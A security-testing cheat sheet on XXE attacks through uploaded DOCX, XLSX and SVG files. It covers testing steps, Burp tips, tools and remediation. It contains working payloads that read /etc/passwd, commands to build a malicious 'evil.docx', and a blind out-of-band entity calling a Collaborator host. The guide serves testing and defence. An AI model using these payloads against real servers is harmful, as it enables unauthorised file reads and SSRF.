# XXE via File Upload (DOCX, SVG, etc.)

## Overview
Many common file formats are XML-based under the hood: DOCX, XLSX, PPTX (Open XML), SVG, ODT, ODS, RSS/Atom feeds, XMP metadata. When an application parses these files server-side and the XML parser has external entity processing enabled, an attacker can craft a malicious document with an XXE payload embedded in the XML content to read server files or make SSRF requests.

## How It Works
- DOCX files are ZIP archives containing XML files (e.g., `word/document.xml`).
- An attacker extracts the DOCX, modifies an XML file to insert a DOCTYPE with external entity reference, re-zips it, and uploads it.
- When the server parses the document, the XML parser resolves the external entity — fetching a local file or making an HTTP request.
- This bypasses "file type" checks that only look at the file extension or MIME type.

## Impact
- Arbitrary local file read on the server (`/etc/passwd`, application config, private keys).
- SSRF to internal services and cloud metadata APIs.
- Blind XXE for out-of-band data exfiltration via DNS or HTTP.

## Where to Look
- Document upload features: resume upload, contract upload, "import" features.
- Spreadsheet import: CSV, XLSX, ODS.
- SVG upload for logos, icons, artwork.
- PDF generation from uploaded HTML or DOCX.
- RSS/Atom feed import functionality.
- Any feature that parses XML-based files server-side.

## Testing Steps
1. Identify file upload features that process document formats.
2. For DOCX: create a benign DOCX, unzip it, edit `word/document.xml` to add XXE payload, re-zip.
3. Upload the modified DOCX and check if the server returns file content in an error or response.
4. For SVG: craft SVG with external entity (see XXE and SVG sections).
5. For blind XXE: use Burp Collaborator URL in the external entity to detect OOB interaction.
6. Test XLSX: edit `xl/workbook.xml` or `xl/worksheets/sheet1.xml` with XXE payload.

## Payloads / Techniques
```bash
# Modify DOCX to inject XXE
unzip legit.docx -d docx_extracted/
# Edit docx_extracted/word/document.xml
# Add to the top after <?xml version="1.0" ...?>:
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="..." ...>
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

```bash
# Re-zip as DOCX
cd docx_extracted && zip -r ../evil.docx .
```

```xml
<!-- SVG XXE -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

```xml
<!-- Blind OOB XXE in any XML file -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR.net/">
  %xxe;
]>
<foo>test</foo>
```

## Burp Suite Tips
- Use **Burp Collaborator** to detect blind XXE from file processing.
- After uploading the malicious file, monitor Collaborator for DNS and HTTP interactions.
- **Active Scanner** (Pro) may detect XXE in direct XML submissions but may not test file upload XXE — manual testing is required.
- The **Upload Scanner** BApp extension automates testing multiple file types including DOCX/XLSX/SVG.

## Tools
- Burp Suite Collaborator
- Upload Scanner (BApp)
- oxml_xxe — https://github.com/BuffaloWill/oxml_xxe (automated XXE injection into DOCX/XLSX/PPTX)
- Python `zipfile` for manual DOCX modification

## Remediation
- Disable external entity processing in all XML parsers used to process uploaded files.
- Use `defusedxml` in Python, or `XMLInputFactory.setProperty(SUPPORT_DTD, false)` in Java.
- Strip or reject DOCTYPE declarations from uploaded XML-based documents.
- Validate the file content after parsing rather than before (ensure no external references were resolved).
- Process file uploads in a sandboxed, network-isolated environment.

## References
https://portswigger.net/web-security/xxe/exploiting
https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
https://github.com/BuffaloWill/oxml_xxe
